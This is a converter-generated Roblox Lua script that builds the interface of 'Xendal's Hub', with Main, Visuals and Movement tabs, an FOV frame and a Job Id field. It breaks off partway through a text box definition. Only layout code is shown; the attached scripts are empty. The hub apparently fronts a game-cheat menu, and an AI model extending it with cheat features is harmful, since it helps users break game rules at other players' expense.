
local G2L = {};

-- StarterGui.Xendal
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["Name"] = [[Xendal]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.Xendal.mobile
G2L["2"] = Instance.new("LocalScript", G2L["1"]);
G2L["2"]["Name"] = [[mobile]];


-- StarterGui.Xendal.avatar
G2L["3"] = Instance.new("LocalScript", G2L["1"]);
G2L["3"]["Name"] = [[avatar]];


-- StarterGui.Xendal.NotifierScript
G2L["4"] = Instance.new("LocalScript", G2L["1"]);
G2L["4"]["Name"] = [[NotifierScript]];


-- StarterGui.Xendal.Value
G2L["5"] = Instance.new("BoolValue", G2L["1"]);



-- StarterGui.Xendal.Value
G2L["6"] = Instance.new("BoolValue", G2L["1"]);



-- StarterGui.Xendal.UICorner
G2L["7"] = Instance.new("UICorner", G2L["1"]);



-- StarterGui.Xendal.ImageLabel
G2L["8"] = Instance.new("ImageLabel", G2L["1"]);
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["8"]["Image"] = [[rbxassetid://77442788468779]];
G2L["8"]["Size"] = UDim2.new(0, 18, 0, 20);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["BackgroundTransparency"] = 1;
G2L["8"]["Position"] = UDim2.new(-0.04208, 0, -0.22, 0);


-- StarterGui.Xendal.UIStroke
G2L["9"] = Instance.new("UIStroke", G2L["1"]);
G2L["9"]["Transparency"] = 0.45;


-- StarterGui.Xendal.Xandal's
G2L["a"] = Instance.new("Frame", G2L["1"]);
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(19, 19, 19);
G2L["a"]["Size"] = UDim2.new(0, 487, 0, 326);
G2L["a"]["Position"] = UDim2.new(0.37025, 0, 0.23109, 0);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Name"] = [[Xandal's]];


-- StarterGui.Xendal.Xandal's.dragg
G2L["b"] = Instance.new("LocalScript", G2L["a"]);
G2L["b"]["Name"] = [[dragg]];


-- StarterGui.Xendal.Xandal's.keybing
G2L["c"] = Instance.new("LocalScript", G2L["a"]);
G2L["c"]["Name"] = [[keybing]];


-- StarterGui.Xendal.Xandal's.UICorner
G2L["d"] = Instance.new("UICorner", G2L["a"]);



-- StarterGui.Xendal.Xandal's.Top
G2L["e"] = Instance.new("Frame", G2L["a"]);
G2L["e"]["ZIndex"] = 2;
G2L["e"]["BorderSizePixel"] = 3;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["e"]["Size"] = UDim2.new(0, 488, 0, 46);
G2L["e"]["Position"] = UDim2.new(-0.003, 0, -0.00187, 0);
G2L["e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["Name"] = [[Top]];
G2L["e"]["BackgroundTransparency"] = 0.6;


-- StarterGui.Xendal.Xandal's.Top.UICorner
G2L["f"] = Instance.new("UICorner", G2L["e"]);
G2L["f"]["CornerRadius"] = UDim.new(0, 11);


-- StarterGui.Xendal.Xandal's.Top.Close
G2L["10"] = Instance.new("ImageButton", G2L["e"]);
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["BackgroundTransparency"] = 1;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Size"] = UDim2.new(0, 27, 0, 27);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Name"] = [[Close]];
G2L["10"]["Position"] = UDim2.new(0.91451, 0, 0.091, 3);


-- StarterGui.Xendal.Xandal's.Top.Close.LocalScript
G2L["11"] = Instance.new("LocalScript", G2L["10"]);



-- StarterGui.Xendal.Xandal's.Top.Close.TextLabel
G2L["12"] = Instance.new("TextLabel", G2L["10"]);
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["TextSize"] = 20;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(151, 151, 151);
G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Heavy, Enum.FontStyle.Normal);
G2L["12"]["TextColor3"] = Color3.fromRGB(154, 0, 0);
G2L["12"]["BackgroundTransparency"] = 1;
G2L["12"]["Size"] = UDim2.new(0, 28, 0, 19);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Text"] = [[×]];
G2L["12"]["Position"] = UDim2.new(-0.00512, 0, 0.22301, -1);


-- StarterGui.Xendal.Xandal's.Top.Minimize
G2L["13"] = Instance.new("ImageButton", G2L["e"]);
G2L["13"]["BorderSizePixel"] = 0;
G2L["13"]["BackgroundTransparency"] = 1;
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["Size"] = UDim2.new(0, 27, 0, 27);
G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["Name"] = [[Minimize]];
G2L["13"]["Position"] = UDim2.new(0.87352, 0, 0.091, 3);


-- StarterGui.Xendal.Xandal's.Top.Minimize.LocalScript
G2L["14"] = Instance.new("LocalScript", G2L["13"]);



-- StarterGui.Xendal.Xandal's.Top.Minimize.TextLabel
G2L["15"] = Instance.new("TextLabel", G2L["13"]);
G2L["15"]["BorderSizePixel"] = 0;
G2L["15"]["TextSize"] = 20;
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(151, 151, 151);
G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Heavy, Enum.FontStyle.Normal);
G2L["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15"]["BackgroundTransparency"] = 1;
G2L["15"]["Size"] = UDim2.new(0, 28, 0, 10);
G2L["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["Text"] = [[_]];
G2L["15"]["Position"] = UDim2.new(-0.09, 0, 0.104, -1);


-- StarterGui.Xendal.Xandal's.Top.TextLabel
G2L["16"] = Instance.new("TextLabel", G2L["e"]);
G2L["16"]["TextWrapped"] = true;
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["TextSize"] = 16;
G2L["16"]["TextScaled"] = true;
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["BackgroundTransparency"] = 1;
G2L["16"]["Size"] = UDim2.new(0, -107, 0, -27);
G2L["16"]["Visible"] = false;
G2L["16"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["Text"] = [[Xandal's Hub]];
G2L["16"]["Position"] = UDim2.new(0.615, 0, 0.761, 0);


-- StarterGui.Xendal.Xandal's.Top.Title
G2L["17"] = Instance.new("TextButton", G2L["e"]);
G2L["17"]["TextWrapped"] = true;
G2L["17"]["BorderSizePixel"] = 0;
G2L["17"]["TextSize"] = 16;
G2L["17"]["TextScaled"] = true;
G2L["17"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["17"]["BackgroundTransparency"] = 1;
G2L["17"]["Size"] = UDim2.new(0, 112, 0, 25);
G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Text"] = [[Xendal's Hub]];
G2L["17"]["Name"] = [[Title]];
G2L["17"]["Position"] = UDim2.new(0.5, 0, 0.217, 0);


-- StarterGui.Xendal.Xandal's.Top.TextLabel
G2L["18"] = Instance.new("TextLabel", G2L["e"]);
G2L["18"]["TextWrapped"] = true;
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["TextSize"] = 16;
G2L["18"]["TextScaled"] = true;
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["BackgroundTransparency"] = 1;
G2L["18"]["Size"] = UDim2.new(0, -52, 0, -20);
G2L["18"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["Text"] = [[Options]];
G2L["18"]["Position"] = UDim2.new(0.17641, 0, 0.687, 0);


-- StarterGui.Xendal.Xandal's.ProfileFrame
G2L["19"] = Instance.new("Frame", G2L["a"]);
G2L["19"]["ZIndex"] = 99;
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
G2L["19"]["Size"] = UDim2.new(0, 102, 0, 33);
G2L["19"]["Position"] = UDim2.new(0.02071, 0, 0.86557, 0);
G2L["19"]["BorderColor3"] = Color3.fromRGB(22, 22, 22);
G2L["19"]["Name"] = [[ProfileFrame]];
G2L["19"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.ProfileFrame.UICorner
G2L["1a"] = Instance.new("UICorner", G2L["19"]);



-- StarterGui.Xendal.Xandal's.ProfileFrame.AvatarImage
G2L["1b"] = Instance.new("ImageLabel", G2L["19"]);
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["1b"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
G2L["1b"]["Size"] = UDim2.new(0, 35, 0, 35);
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Name"] = [[AvatarImage]];
G2L["1b"]["Position"] = UDim2.new(-0.018, 0, -0.1, 0);


-- StarterGui.Xendal.Xandal's.ProfileFrame.AvatarImage.UICorner
G2L["1c"] = Instance.new("UICorner", G2L["1b"]);
G2L["1c"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.ProfileFrame.Username
G2L["1d"] = Instance.new("TextLabel", G2L["19"]);
G2L["1d"]["TextWrapped"] = true;
G2L["1d"]["TextTruncate"] = Enum.TextTruncate.AtEnd;
G2L["1d"]["BorderSizePixel"] = 0;
G2L["1d"]["TextSize"] = 12;
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1d"]["TextColor3"] = Color3.fromRGB(68, 68, 68);
G2L["1d"]["BackgroundTransparency"] = 1;
G2L["1d"]["Size"] = UDim2.new(0, 53, 0, 12);
G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["Name"] = [[Username]];
G2L["1d"]["Position"] = UDim2.new(0.389, 0, 0.59, 0);


-- StarterGui.Xendal.Xandal's.ProfileFrame.DisplayName
G2L["1e"] = Instance.new("TextLabel", G2L["19"]);
G2L["1e"]["TextWrapped"] = true;
G2L["1e"]["TextTruncate"] = Enum.TextTruncate.AtEnd;
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["TextSize"] = 12;
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["BackgroundTransparency"] = 1;
G2L["1e"]["Size"] = UDim2.new(0, 53, 0, 13);
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["Name"] = [[DisplayName]];
G2L["1e"]["Position"] = UDim2.new(0.389, 0, 0.088, 0);


-- StarterGui.Xendal.Xandal's.DISCORD
G2L["1f"] = Instance.new("TextButton", G2L["a"]);
G2L["1f"]["TextWrapped"] = true;
G2L["1f"]["Active"] = false;
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["TextSize"] = 14;
G2L["1f"]["TextScaled"] = true;
G2L["1f"]["TextColor3"] = Color3.fromRGB(83, 95, 224);
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["1f"]["ZIndex"] = 999;
G2L["1f"]["BackgroundTransparency"] = 1;
G2L["1f"]["Size"] = UDim2.new(0, -32, 0, 23);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Text"] = [[]];
G2L["1f"]["Name"] = [[DISCORD]];
G2L["1f"]["Position"] = UDim2.new(0.48782, 0, 0.033, 0);


-- StarterGui.Xendal.Xandal's.DISCORD.LocalScript
G2L["20"] = Instance.new("LocalScript", G2L["1f"]);



-- StarterGui.Xendal.Xandal's.DISCORD.UIStroke
G2L["21"] = Instance.new("UIStroke", G2L["1f"]);
G2L["21"]["Transparency"] = 0.45;


-- StarterGui.Xendal.Xandal's.DISCORD.ImageLabel
G2L["22"] = Instance.new("ImageLabel", G2L["1f"]);
G2L["22"]["BorderSizePixel"] = 0;
G2L["22"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["22"]["Image"] = [[rbxassetid://76181608348088]];
G2L["22"]["Size"] = UDim2.new(0, 20, 0, 15);
G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["22"]["BackgroundTransparency"] = 1;
G2L["22"]["Position"] = UDim2.new(0.5, 0, 0.18, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui
G2L["23"] = Instance.new("Frame", G2L["a"]);
G2L["23"]["BorderSizePixel"] = 0;
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["23"]["Size"] = UDim2.new(0, 351, 0, 271);
G2L["23"]["Position"] = UDim2.new(0.26489, 0, 0.13804, 0);
G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["Name"] = [[SettingsGui]];
G2L["23"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Options
G2L["24"] = Instance.new("Frame", G2L["23"]);
G2L["24"]["BorderSizePixel"] = 0;
G2L["24"]["BackgroundColor3"] = Color3.fromRGB(23, 23, 23);
G2L["24"]["Size"] = UDim2.new(0, 123, 0, 326);
G2L["24"]["Position"] = UDim2.new(0, -131, 0, -45);
G2L["24"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
G2L["24"]["Name"] = [[Options]];
G2L["24"]["BackgroundTransparency"] = 0.6;


-- StarterGui.Xendal.Xandal's.SettingsGui.Options.LocalScript
G2L["25"] = Instance.new("LocalScript", G2L["24"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Options.UIStroke
G2L["26"] = Instance.new("UIStroke", G2L["24"]);
G2L["26"]["Thickness"] = 0.5;
G2L["26"]["Color"] = Color3.fromRGB(51, 51, 51);


-- StarterGui.Xendal.Xandal's.SettingsGui.Options.UICorner
G2L["27"] = Instance.new("UICorner", G2L["24"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Options.UIPadding
G2L["28"] = Instance.new("UIPadding", G2L["24"]);
G2L["28"]["PaddingTop"] = UDim.new(0, 6);


-- StarterGui.Xendal.Xandal's.SettingsGui.Options.Main
G2L["29"] = Instance.new("TextButton", G2L["24"]);
G2L["29"]["BorderSizePixel"] = 0;
G2L["29"]["TextSize"] = 14;
G2L["29"]["TextColor3"] = Color3.fromRGB(168, 168, 168);
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["29"]["BackgroundTransparency"] = 0.8;
G2L["29"]["Size"] = UDim2.new(0, 120, 0, 32);
G2L["29"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["Text"] = [[Main]];
G2L["29"]["Name"] = [[Main]];
G2L["29"]["Position"] = UDim2.new(0.01626, 0, 0.16718, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Options.Main.LocalScript
G2L["2a"] = Instance.new("LocalScript", G2L["29"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Options.Visuals
G2L["2b"] = Instance.new("TextButton", G2L["24"]);
G2L["2b"]["BorderSizePixel"] = 0;
G2L["2b"]["TextSize"] = 14;
G2L["2b"]["TextColor3"] = Color3.fromRGB(168, 168, 168);
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["2b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["2b"]["BackgroundTransparency"] = 0.8;
G2L["2b"]["Size"] = UDim2.new(0, 120, 0, 32);
G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["Text"] = [[Visuals]];
G2L["2b"]["Name"] = [[Visuals]];
G2L["2b"]["Position"] = UDim2.new(0.01626, 0, 0.42415, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Options.Visuals.LocalScript
G2L["2c"] = Instance.new("LocalScript", G2L["2b"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Options.Movement
G2L["2d"] = Instance.new("TextButton", G2L["24"]);
G2L["2d"]["BorderSizePixel"] = 0;
G2L["2d"]["TextSize"] = 14;
G2L["2d"]["TextColor3"] = Color3.fromRGB(168, 168, 168);
G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(28, 28, 28);
G2L["2d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["2d"]["BackgroundTransparency"] = 0.8;
G2L["2d"]["Size"] = UDim2.new(0, 120, 0, 32);
G2L["2d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["Text"] = [[Movement]];
G2L["2d"]["Name"] = [[Movement]];
G2L["2d"]["Position"] = UDim2.new(0.01626, 0, 0.29412, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Options.Movement.LocalScript
G2L["2e"] = Instance.new("LocalScript", G2L["2d"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Options.Frame
G2L["2f"] = Instance.new("Frame", G2L["24"]);
G2L["2f"]["ZIndex"] = 2;
G2L["2f"]["BorderSizePixel"] = 0;
G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(51, 51, 51);
G2L["2f"]["Size"] = UDim2.new(0, 124, 0, -1);
G2L["2f"]["Position"] = UDim2.new(-0.011, 0, 0.835, 0);
G2L["2f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings
G2L["30"] = Instance.new("Frame", G2L["23"]);
G2L["30"]["BorderSizePixel"] = 0;
G2L["30"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["30"]["Size"] = UDim2.new(0, 351, 0, 281);
G2L["30"]["Position"] = UDim2.new(-0.00007, 0, -0.00218, 0);
G2L["30"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30"]["Name"] = [[Settings]];
G2L["30"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main
G2L["31"] = Instance.new("Frame", G2L["30"]);
G2L["31"]["ZIndex"] = 3;
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(10, 30, 13);
G2L["31"]["ClipsDescendants"] = true;
G2L["31"]["Size"] = UDim2.new(0, 366, 0, 281);
G2L["31"]["Position"] = UDim2.new(-0.02286, 0, 0.00151, 0);
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Name"] = [[Main]];
G2L["31"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.Frame
G2L["32"] = Instance.new("Frame", G2L["31"]);
G2L["32"]["BorderSizePixel"] = 0;
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(34, 34, 34);
G2L["32"]["Size"] = UDim2.new(0, 373, 0, 25);
G2L["32"]["Position"] = UDim2.new(-0.0198, 0, -0.00105, 0);
G2L["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["BackgroundTransparency"] = 0.6;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.Frame.UICorner
G2L["33"] = Instance.new("UICorner", G2L["32"]);



-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.Frame.TextLabel
G2L["34"] = Instance.new("TextLabel", G2L["32"]);
G2L["34"]["BorderSizePixel"] = 0;
G2L["34"]["TextSize"] = 14;
G2L["34"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["34"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["34"]["BackgroundTransparency"] = 1;
G2L["34"]["Size"] = UDim2.new(0, 48, 0, 16);
G2L["34"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["34"]["Text"] = [[--Main--]];
G2L["34"]["Position"] = UDim2.new(0.42265, 0, 0.16, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame
G2L["35"] = Instance.new("ScrollingFrame", G2L["31"]);
G2L["35"]["Active"] = true;
G2L["35"]["ZIndex"] = 2;
G2L["35"]["BorderSizePixel"] = 0;
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
G2L["35"]["Size"] = UDim2.new(0, 364, 0, 255);
G2L["35"]["ScrollBarImageColor3"] = Color3.fromRGB(68, 68, 68);
G2L["35"]["Position"] = UDim2.new(-0.00068, 0, 0.09148, 0);
G2L["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["ScrollBarThickness"] = 4;
G2L["35"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.BrokenToggle
G2L["36"] = Instance.new("Frame", G2L["35"]);
G2L["36"]["BorderSizePixel"] = 0;
G2L["36"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["36"]["Size"] = UDim2.new(0, 78, 0, 75);
G2L["36"]["Position"] = UDim2.new(0.73515, 0, 0.63366, 0);
G2L["36"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["36"]["Name"] = [[BrokenToggle]];
G2L["36"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.BrokenToggle.Main Handler
G2L["37"] = Instance.new("LocalScript", G2L["36"]);
G2L["37"]["Name"] = [[Main Handler]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.BrokenToggle.Holder
G2L["38"] = Instance.new("Frame", G2L["36"]);
G2L["38"]["Visible"] = false;
G2L["38"]["ZIndex"] = 2;
G2L["38"]["BorderSizePixel"] = 0;
G2L["38"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["38"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["38"]["Size"] = UDim2.new(0.589, 0, 0.31, 0);
G2L["38"]["Position"] = UDim2.new(0.459, 0, 2.26667, -2);
G2L["38"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["38"]["Name"] = [[Holder]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.BrokenToggle.Holder.Circle
G2L["39"] = Instance.new("Frame", G2L["38"]);
G2L["39"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["39"]["Size"] = UDim2.new(0.43831, 0, 1, 1);
G2L["39"]["Position"] = UDim2.new(-0.00422, 0, 0.5, 0);
G2L["39"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["39"]["Name"] = [[Circle]];


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.BrokenToggle.Holder.Circle.Mini
G2L["3a"] = Instance.new("Frame", G2L["39"]);
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(61, 61, 61);
G2L["3a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["3a"]["Size"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["3a"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3a"]["Name"] = [[Mini]];
G2L["3a"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.BrokenToggle.Holder.Circle.Mini.UICorner
G2L["3b"] = Instance.new("UICorner", G2L["3a"]);
G2L["3b"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.BrokenToggle.Holder.Circle.UICorner
G2L["3c"] = Instance.new("UICorner", G2L["39"]);
G2L["3c"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.BrokenToggle.Holder.Button
G2L["3d"] = Instance.new("TextButton", G2L["38"]);
G2L["3d"]["BorderSizePixel"] = 0;
G2L["3d"]["TextSize"] = 14;
G2L["3d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3d"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["3d"]["BackgroundTransparency"] = 1;
G2L["3d"]["Size"] = UDim2.new(1.1, 0, 1.25, 0);
G2L["3d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["3d"]["Text"] = [[]];
G2L["3d"]["Name"] = [[Button]];
G2L["3d"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.BrokenToggle.Holder.UIPadding
G2L["3e"] = Instance.new("UIPadding", G2L["38"]);
G2L["3e"]["PaddingTop"] = UDim.new(0, 4);
G2L["3e"]["PaddingRight"] = UDim.new(0, 4);
G2L["3e"]["PaddingLeft"] = UDim.new(0, 4);
G2L["3e"]["PaddingBottom"] = UDim.new(0, 4);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.BrokenToggle.Holder.UICorner
G2L["3f"] = Instance.new("UICorner", G2L["38"]);
G2L["3f"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id
G2L["40"] = Instance.new("Frame", G2L["35"]);
G2L["40"]["BorderSizePixel"] = 0;
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["40"]["Size"] = UDim2.new(0, 325, 0, 48);
G2L["40"]["Position"] = UDim2.new(0.04868, 0, 0.82223, 0);
G2L["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["Name"] = [[Job Id]];
G2L["40"]["BackgroundTransparency"] = 0.8;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig
G2L["41"] = Instance.new("Frame", G2L["40"]);
G2L["41"]["ZIndex"] = 4;
G2L["41"]["BorderSizePixel"] = 0;
G2L["41"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["41"]["Size"] = UDim2.new(0, 157, 0, 35);
G2L["41"]["Position"] = UDim2.new(0.47273, 0, 0.14325, 0);
G2L["41"]["Name"] = [[FOVConfig]];
G2L["41"]["BackgroundTransparency"] = 1;


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig.UICorner
G2L["42"] = Instance.new("UICorner", G2L["41"]);
G2L["42"]["CornerRadius"] = UDim.new(0.25, 0);


-- StarterGui.Xendal.Xandal's.SettingsGui.Settings.Main.ScrollingFrame.Job Id.FOVConfig.JobSet
G2L["43"] = Instance.new("TextBox", G2L["41"]);
G2L["43"]["Name"] = [[JobSet]];
G2L["43"]["PlaceholderColor3"] = Color3.fromRGB(169, 169, 169);
G2L["43"]["TextWrapped"] = true;
G2L["43"]["TextSize"] = 19;
G2L["43"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["43"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["43"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["43"]["PlaceholderText"] = [[Enter Job Id]];
